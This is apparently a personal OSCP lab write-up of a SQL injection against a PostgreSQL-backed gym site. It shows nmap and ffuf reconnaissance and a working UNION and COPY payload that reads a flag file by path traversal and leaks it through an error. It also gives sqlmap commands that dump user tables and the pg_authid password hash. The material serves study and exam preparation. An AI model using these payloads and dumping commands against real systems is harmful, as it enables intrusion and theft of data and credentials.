---
aliases:
  - SQL Injection
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - web_application
  - web_app
  - sql_injection
  - sqli
author: Mehdi N Tehrani
creat_date: 2023-12-26
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# 10.2.3 Q6
#postgresql #postgres #copy #copy_to #copy_from #error_based
## nmap
```
$ sudo nmap -T4 192.168.227.48 -sS -v 

PORT     STATE SERVICE
22/tcp   open  ssh

PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later

80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Golden Glove Gym
```

## ffuf
```
$ ffuf -u "http://goldenclove.com/FUZZ" -w /usr/share/wordlists/dirb/common.txt -r

.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 278ms]
                        [Status: 200, Size: 46446, Words: 18541, Lines: 784, Duration: 2416ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2412ms]
.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 4367ms]
css                     [Status: 200, Size: 942, Words: 61, Lines: 17, Duration: 274ms]
index.php               [Status: 200, Size: 46446, Words: 18541, Lines: 784, Duration: 274ms]
img                     [Status: 200, Size: 4406, Words: 225, Lines: 34, Duration: 273ms]
js                      [Status: 200, Size: 931, Words: 64, Lines: 17, Duration: 348ms]
lib                     [Status: 200, Size: 1330, Words: 88, Lines: 19, Duration: 277ms]
mail                    [Status: 200, Size: 1381, Words: 90, Lines: 19, Duration: 273ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 272ms]
```


## sqli
> FLAG!

#postgresql #postgres #sqli #sql_injection 
```
POST /class.php HTTP/1.1
Host: goldenclove.com
...

weight=80&age=33&gender=Female&email=me%40test.com&height=skrill%40lab.lab'+union+select+'1',2,3,'4','5',null;COPY+pg_seclabel+from+'../../../../../var/www/flag.txt'--
```
OUTPUT:
```
...
<b>Warning</b>:  pg_query(): Query failed: ERROR:  invalid input syntax for type oid: &quot;OS{}&quot;
CONTEXT:  COPY pg_seclabel, line 1, column objoid: &quot;OS{f52aa6792d2c39fd772b52d011579692}&quot; in <b>/var/www/html/class.php</b> on line <b>423</b>
...
```


# other info

## sqlmap
#sqlmap
```
$ sqlmap -r ./class.req --dbms=postgresql -p height --dump

Table: users
[4 entries]
+----------------+--------+--------+--------+----------+----------------------------+
| email          | gender | height | weight | active   | created_at                 |
+----------------+--------+--------+--------+----------+----------------------------+
| dave@lab.lab   | male   | 342    | 40     | no       | 2022-06-20 13:50:16.481982 |
| Selena@lab.lab | male   | 322    | 34     | no       | 2022-06-20 13:49:59.408325 |
| skrill@lab.lab | male   | 64     | 40     | yes      | 2022-06-20 13:08:41.095354 |
| steve@lab.lab  | male   | 234    | 54     | yes      | 2022-06-20 13:50:08.404948 |
+----------------+--------+--------+--------+----------+----------------------------+
```

### dbs
```
$ sqlmap -r ./class.req --dbms=postgresql -p height --dbs

available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

```
$ sqlmap -r ./class.req --dbms=postgresql -p height -D public --dump

Database: public
Table: users
[4 entries]
+----------------+--------+--------+--------+----------+----------------------------+
| email          | gender | height | weight | active   | created_at                 |
+----------------+--------+--------+--------+----------+----------------------------+
| dave@lab.lab   | male   | 342    | 40     | no       | 2022-06-20 13:50:16.481982 |
| Selena@lab.lab | male   | 322    | 34     | no       | 2022-06-20 13:49:59.408325 |
| skrill@lab.lab | male   | 64     | 40     | yes      | 2022-06-20 13:08:41.095354 |
| steve@lab.lab  | male   | 234    | 54     | yes      | 2022-06-20 13:50:08.404948 |
+----------------+--------+--------+--------+----------+----------------------------+
```

```
$ sqlmap -r ./class.req --dbms=postgresql -p height -D pg_catalog --tables

Database: pg_catalog
[62 tables]
+-------------------------+
| pg_aggregate            |
| pg_am                   |
| pg_amop                 |
| pg_amproc               |
| pg_attrdef              |
| pg_attribute            |
| pg_auth_members         |
| pg_authid               |
| pg_cast                 |
| pg_class                |
| pg_collation            |
| pg_constraint           |
| pg_conversion           |
| pg_database             |
| pg_db_role_setting      |
| pg_default_acl          |
| pg_depend               |
| pg_description          |
| pg_enum                 |
| pg_event_trigger        |
| pg_extension            |
| pg_foreign_data_wrapper |
| pg_foreign_server       |
| pg_foreign_table        |
| pg_index                |
| pg_inherits             |
| pg_init_privs           |
| pg_language             |
| pg_largeobject          |
| pg_largeobject_metadata |
| pg_namespace            |
| pg_opclass              |
| pg_operator             |
| pg_opfamily             |
| pg_partitioned_table    |
| pg_policy               |
| pg_proc                 |
| pg_publication          |
| pg_publication_rel      |
| pg_range                |
| pg_replication_origin   |
| pg_rewrite              |
| pg_seclabel             |
| pg_sequence             |
| pg_shdepend             |
| pg_shdescription        |
| pg_shseclabel           |
| pg_statistic            |
| pg_statistic_ext        |
| pg_statistic_ext_data   |
| pg_subscription         |
| pg_subscription_rel     |
| pg_tablespace           |
| pg_transform            |
| pg_trigger              |
| pg_ts_config            |
| pg_ts_config_map        |
| pg_ts_dict              |
| pg_ts_parser            |
| pg_ts_template          |
| pg_type                 |
| pg_user_mapping         |
+-------------------------+
```

```
Database: pg_catalog
Table: pg_authid
[10 entries]
+-------+---------------------------+----------+------------+-------------+-------------+-------------------------------------+--------------+--------------+---------------+---------------+----------------+
| oid   | rolname                   | rolsuper | rolinherit | rolcanlogin | rolcreatedb | rolpassword                         | rolbypassrls | rolconnlimit | rolcreaterole | rolvaliduntil | rolreplication |
+-------+---------------------------+----------+------------+-------------+-------------+-------------------------------------+--------------+--------------+---------------+---------------+----------------+
| 10    | postgres                  | true     | true       | true        | true        | NULL                                | true         | -1           | true          | NULL          | true           |
| 3373  | pg_monitor                | false    | true       | false       | false       | NULL                                | false        | -1           | false         | NULL          | false          |
| 3374  | pg_read_all_settings      | false    | true       | false       | false       | NULL                                | false        | -1           | false         | NULL          | false          |
| 3375  | pg_read_all_stats         | false    | true       | false       | false       | NULL                                | false        | -1           | false         | NULL          | false          |
| 3377  | pg_stat_scan_tables       | false    | true       | false       | false       | NULL                                | false        | -1           | false         | NULL          | false          |
| 4200  | pg_signal_backend         | false    | true       | false       | false       | NULL                                | false        | -1           | false         | NULL          | false          |
| 4569  | pg_read_server_files      | false    | true       | false       | false       | NULL                                | false        | -1           | false         | NULL          | false          |
| 4570  | pg_write_server_files     | false    | true       | false       | false       | NULL                                | false        | -1           | false         | NULL          | false          |
| 4571  | pg_execute_server_program | false    | true       | false       | false       | NULL                                | false        | -1           | false         | NULL          | false          |
| 16384 | rubben                    | true     | true       | true        | false       | md5ae8c67affdb169a42c9631c02fc67ede | false        | -1           | false         | NULL          | false          |
+-------+---------------------------+----------+------------+-------------+-------------+-------------------------------------+--------------+--------------+---------------+---------------+----------------+
```